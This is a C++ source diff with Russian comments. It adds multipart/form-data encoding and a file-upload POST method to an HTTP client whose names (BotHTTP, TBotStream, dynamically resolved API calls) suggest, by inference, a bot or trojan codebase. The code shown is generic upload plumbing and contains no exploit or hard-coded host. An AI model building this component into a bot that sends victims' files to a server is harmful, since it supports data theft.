@@ -10,6 +10,7 @@
 #include "Utils.h"
 #include "BotHTTP.h"
 #include "HTTPConsts.h"
+#include "StrConsts.h"
 
 //#include "Modules.h"
 
@@ -1162,8 +1163,6 @@ namespace MPDReader
 {
 
 	const static PCHAR BoundaryDelimeter = "--";
-	const static PCHAR ContentDispositionName = "Content-Disposition: form-data; name=\"";
-	const static PCHAR FileNameHeader = "; filename=\"";
 	const static PCHAR ContentTypeHeader = "Content-Type: ";
 	const static PCHAR DefaultContentType = "application/octet-stream";
 	const static PCHAR TransferEncodingHeader ="Content-Transfer-Encoding: binary";
@@ -1375,7 +1374,7 @@ PMultiPartData MultiPartData::Create()
 	// Создать набор данных
 	const static PCHAR Boundary = "---------";
 	const BYTE MaxBnd = 16;
-	PMultiPartData Data = CreateStruct(TMultiPartData);
+	PMultiPartData Data = CreateStruct(TMultiPartDataRec);
 	if (Data == NULL)
 		return NULL;
 
@@ -1451,14 +1450,14 @@ PMultiPartItem  MultiPartData::AddFileField(PMultiPartData Data, PCHAR Name,
 	PMultiPartItem Item = AddBlobField(Data, Name, NULL, Size);
 	if (Item == NULL)
 	{
-        pCloseHandle(H);
+		pCloseHandle(H);
 		return NULL;
-    }
+	}
 
-	Item->FileName = STR::New(FileName);
-	Item->FileHandle = H;
+	Item->FileName    = STR::New(FileName);
+	Item->FileHandle  = H;
 	Item->ContentType = STR::New(ContentType);
-    return Item;
+	return Item;
 }
 
 
@@ -2498,6 +2497,310 @@ bool THTTPChunks::Completed()
 
 
 
+
+
+// ***************************************************************************
+// 								TMultiPartDataItem
+// ***************************************************************************
+TMultiPartDataItem::TMultiPartDataItem(TBotCollection* Owner)
+    : TBotCollectionItem(Owner)
+{
+	FData = NULL;
+	FSize = 0;
+}
+
+TMultiPartDataItem::TMultiPartDataItem(TBotCollection* Owner, LPVOID Data, DWORD DataSize)
+	: TBotCollectionItem(Owner)
+{
+	FData = NULL;
+	FSize = 0;
+    SetData(Data, DataSize);
+}
+//-----------------------------------------------------------
+
+TMultiPartDataItem::~TMultiPartDataItem()
+{
+	if (FData) MemFree(FData);
+	if (FFile) delete FFile;
+
+}
+//-----------------------------------------------------------
+
+void TMultiPartDataItem::SetData(LPVOID Data, DWORD DataSize)
+{
+	// Функция устанавливает данные элемента
+	if (FData)
+	{
+		MemFree(FData);
+		FData = NULL;
+		FSize = 0;
+	}
+
+	if (Data && DataSize)
+	{
+		FData = MemAlloc(DataSize);
+		if (FData)
+		{
+			FSize = DataSize;
+			m_memcpy(FData, Data, DataSize);
+		}
+	}
+}
+
+//-----------------------------------------------------------
+
+void TMultiPartDataItem::MakeHeader()
+{
+	// Функция генерирует заголовок блока
+	if (!FBlockHeader.IsEmpty()) return;
+
+
+	FBlockHeader = GetStr(HTTPFormContentDisposition);
+
+	string Name;
+	Name.Format(GetStr(HTTPFormFieldName).t_str(), FName.t_str());
+
+	FBlockHeader += Name;
+
+	if (!FFileName.IsEmpty())
+	{
+		// Добавляем информацию о файле
+		if (FContentType.IsEmpty())
+			FContentType = GetStr(HTTPOctetStream);
+
+		string FileInfo;
+		FileInfo.Format(GetStr(HTTPFormFileInfo).t_str(), FFileName.t_str(), FContentType.t_str());
+		FBlockHeader += FileInfo;
+    }
+
+	FBlockHeader += LineBreak2;
+}
+//-----------------------------------------------------------
+
+bool TMultiPartDataItem::WriteDataToBuf(LPBYTE Buf, DWORD BufSize, DWORD Offset, DWORD &Writen)
+{
+	// Функция записывает порцию данных в буфер
+	// Должна вернуть истину, если данные записаны полностью
+	Writen = 0;
+	if (!Buf || !BufSize) return false;
+
+	Writen = Min(FSize - Offset, BufSize);
+
+	if (Writen)
+	{
+		if (FFile)
+			Writen = FFile->Read(Buf, Writen);
+		else
+			m_memcpy(Buf, FData, Writen);
+    }
+
+    return Offset + Writen == FSize;
+}
+
+
+
+// ***************************************************************************
+// 								 TMultiPartData
+// ***************************************************************************
+
+TMultiPartData::TMultiPartData()
+{
+	FBoundary = Random::RandomString2(20, 'A', 'Z');
+	FPosition = 0;
+}
+//-----------------------------------------------------------
+
+DWORD TMultiPartData::Size()
+{
+	// Функция расчитывает итоговый размер данных
+	int Count = FItems.Count();
+
+	// Подсчитываем размер всех разделителей
+	DWORD S = (2 /* -- */ +
+			   FBoundary.Length() +
+			   2 /* \r\n */  ) * (Count + 1);
+	S += 2 /* -- */;
+
+	// Добавляем размеры данных полей вместе с заголовками
+	for (int i = 0; i < Count; i++)
+	{
+		TMultiPartDataItem *Item = (TMultiPartDataItem*)FItems[i];
+		Item->MakeHeader();
+
+		S += Item->FBlockHeader.Length();
+		S += Item->Size();
+		S += 2; /* \r\n */
+	}
+
+	return S;
+}
+//-----------------------------------------------------------
+
+bool MPD_Write(LPBYTE &Buf, DWORD &BufSize, LPVOID Data, DWORD DataSize, bool FullData)
+{
+	// Фунция записывает блок данных в буфер
+	if (!BufSize || (FullData && BufSize < DataSize))
+		return false;
+
+	DWORD ToCopy = Min(BufSize, DataSize);
+	m_memcpy(Buf, Data, ToCopy);
+	Buf     += ToCopy;
+	BufSize -= ToCopy;
+	return true;
+}
+//-----------------------------------------------------------
+
+DWORD TMultiPartData::Read(void* Buf, DWORD BufSize)
+{
+	// Читаем очередную порцию данных
+	if (!Buf || !BufSize || !FItems.Count() || FCurrentPart == rpCompleted)
+		return 0;
+
+	if (FPosition == 0)
+	{
+		FCurrentItem = 0;
+		FReadOffset = 0;
+		FCurrentPart = rpBoundaryStart;
+	}
+
+    const static char* BoundayPrefix = "--";
+
+	LPBYTE Ptr   = (LPBYTE)Buf;
+	DWORD  Size  = BufSize;
+	bool   Completed = false;
+
+	#define TRYWRITE(D, S, NewPart) if (!MPD_Write(Ptr, Size, (LPVOID)D, S, true)) break; FCurrentPart = NewPart
+
+	#define PART(Part) FCurrentPart == Part
+
+	// Организовываем цикл записи данных
+	do
+	{
+		Completed = FCurrentItem >= FItems.Count();
+
+		//-------------------------------------
+		// записываем 2 символа --  перед разделителем
+		if (PART(rpBoundaryStart))
+		{
+			TRYWRITE(BoundayPrefix, 2, rpBoundary);
+        }
+
+
+		// Записываем разделитель
+		if (PART(rpBoundary))
+		{
+
+			TReadPart NP = (Completed) ? rpBoundaryEnd : rpBoundaryLB;
+			TRYWRITE(FBoundary.t_str(), FBoundary.Length(), NP);
+		}
+
+		// записываем 2 символа --  после последнего разделителя
+		if (PART(rpBoundaryEnd))
+		{
+			TRYWRITE(BoundayPrefix, 2, rpBoundaryLB);
+        }
+
+		// записываем 2 символа \r\n  после разделителя
+		if (PART(rpBoundaryLB))
+		{
+			FReadOffset = 0;
+			TReadPart NP = (Completed) ? rpCompleted : rpHeader;
+			TRYWRITE(LineBreak, 2, NP);
+
+			// Это были символы после последнего разделителя
+			if (NP == rpCompleted)
+				break;
+        }
+
+		// Записываем заголовок блока
+		if (PART(rpHeader))
+		{
+			TMultiPartDataItem *Item = (TMultiPartDataItem *)FItems[FCurrentItem];
+			Item->MakeHeader();
+			DWORD NeedWrite = Item->FBlockHeader.Length() - FReadOffset;
+			if (NeedWrite)
+			{
+				DWORD ToCopy = Min(NeedWrite, Size);
+				m_memcpy(Ptr, Item->FBlockHeader.t_str() + FReadOffset, ToCopy);
+				Size -= ToCopy;
+				Ptr  += ToCopy;
+				FReadOffset += ToCopy;
+
+				if (FReadOffset < Item->FBlockHeader.Length())
+					break; // Буфера не хватило, заголовок записан не полностью.
+			}
+
+			// Переходим в режим записи данных
+			FReadOffset = 0;
+			FCurrentPart = rpData;
+		}
+
+
+		// Записываем данные
+		if (PART(rpData))
+		{
+        	TMultiPartDataItem *Item = (TMultiPartDataItem *)FItems[FCurrentItem];
+            DWORD Writen;
+            bool AllDataWrited = Item->WriteDataToBuf(Ptr, Size, FReadOffset, Writen);
+			Ptr         += Writen;
+			Size        -= Writen;
+			FReadOffset += Writen;
+
+			if (!AllDataWrited) break;
+
+			// Данные элемента прочитаны полностью, переходим
+			// к записи данных другого элемента
+			FCurrentItem++;
+			FCurrentPart = rpDataLB;
+		}
+
+		// Записываем два символа \r\n после данных
+		if (PART(rpDataLB))
+		{
+			TRYWRITE(LineBreak, 2, rpBoundaryStart);
+        }
+	}
+	while (Size && FCurrentPart != rpCompleted);
+
+
+    DWORD Writen = BufSize - Size;
+	FPosition += Writen;
+	return Writen;
+}
+//-----------------------------------------------------------
+
+void TMultiPartData::Add(const char* Name, LPVOID Data, DWORD Size)
+{
+	TMultiPartDataItem *Item = new TMultiPartDataItem(&FItems, Data, Size);
+	Item->FName = Name;
+}
+//-----------------------------------------------------------
+
+void TMultiPartData::AddFile(const char* Name, const char* FileName, const char* CotentType)
+{
+	if (STRA::IsEmpty(Name) || STRA::IsEmpty(FileName))
+		return;
+
+	TBotFileStream* File = new TBotFileStream(FileName, fcmRead);
+	if (!File->Valid())
+	{
+		// Не удалось открыть файл
+		delete File;
+        return;
+    }
+
+	TMultiPartDataItem *Item = new TMultiPartDataItem(&FItems);
+	Item->FName     = Name;
+	Item->FFileName = File::ExtractFileNameA(FileName);
+	Item->FSize     = File->Size();
+	Item->FFile     = File;
+}
+//-----------------------------------------------------------
+
+
+
+
+
 // ***************************************************************************
 // 								THTTP
 // ***************************************************************************
@@ -2538,7 +2841,7 @@ void THTTP::Initialize()
 bool THTTP::SendPostData(TBotStream* Data)
 {
 	// Функция отправляет пост данные на сервер
-	const DWORD Size = 512;
+	const DWORD Size = 4096;
 	TMemory Buf(Size);
 
 
@@ -2868,3 +3171,22 @@ string THTTP::Post(const char *URL, TBotStrings *Fields)
 }
 //----------------------------------------------------------------------------
 
+
+bool THTTP::Post(const char *URL, TMultiPartData *Fields, string &Document)
+{
+	if (STRA::IsEmpty(URL) || !Fields)
+		return false;
+
+	Request.ContentType = string(FormDataMultiPart)  + Fields->FBoundary;
+
+	return ExecuteToStr(hmPOST, URL, Fields, Document);
+}
+//----------------------------------------------------------------------------
+
+string THTTP::Post(const char *URL, TMultiPartData *Fields)
+{
+	string S;
+	Post(URL, Fields, S);
+	return S;
+}
+//----------------------------------------------------------------------------
